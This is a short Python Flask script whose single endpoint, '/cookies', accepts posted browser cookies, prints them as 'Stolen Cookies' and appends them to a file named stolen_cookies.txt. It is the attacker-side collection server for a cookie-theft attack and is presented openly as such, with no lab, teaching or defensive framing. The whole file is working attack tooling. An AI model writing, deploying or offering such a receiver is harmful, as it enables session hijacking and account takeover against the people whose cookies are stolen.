from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/cookies', methods=['POST'])
def receive_cookies():
    data = request.json
    cookies = data.get('cookies', '')
    print('Stolen Cookies:', cookies)
    # You can save the cookies to a file or database here
    with open('stolen_cookies.txt', 'a') as f:
        f.write(cookies + '\n')
    return jsonify({'status': 'success'}), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)